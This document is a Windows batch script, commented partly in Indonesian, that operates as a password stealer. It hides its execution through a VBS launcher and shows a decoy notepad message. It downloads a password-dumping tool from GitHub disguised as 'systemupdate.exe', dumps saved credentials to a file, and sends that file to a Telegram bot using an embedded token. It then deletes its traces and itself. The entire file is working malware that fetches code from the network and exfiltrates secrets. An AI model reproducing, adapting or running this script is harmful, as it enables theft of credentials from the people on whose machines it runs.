@echo off
if exist "%temp%\sys.vbs" goto Steal
goto Cvbs

:Cvbs
echo Set objShell = CreateObject("WScript.Shell")>"%temp%\sys.vbs"
echo objShell.Run "cmd.exe /c ""D:\TEMP\steal.bat""", 0, True >>"%temp%\sys.vbs"
wscript.exe //nologo "%temp%\sys.vbs"
exit

:Steal
echo Your Password Is : 123 > "%temp%\password.txt" & start notepad "%temp%\password.txt"

:: Download pass.exe
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe' -OutFile '%temp%\systemupdate.exe'"

:: Jalankan pass.exe untuk mendapatkan teks password
powershell -Command "& '%temp%\systemupdate.exe' /stext '%temp%\%username%-%computername%.txt'"

:: Upload file ke Telegram menggunakan PowerShell
powershell -Command "$file = '%temp%\%username%-%computername%.txt'; $botToken = '6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0'; $chatId = '365617307'; $uri = 'https://api.telegram.org/bot{0}/sendDocument' -f $botToken; $headers = @{ 'Authorization' = 'Bearer ' + $botToken }; Invoke-WebRequest -Uri $uri -Method Post -InFile $file -ContentType 'multipart/form-data' -Headers $headers"

del "%temp%\systemupdate.exe"
del "%temp%\%username%-%computername%.txt"
del "%temp%\password.txt"
del "%temp%\sys.vbs"
cmd /c del "%~f0"
exit
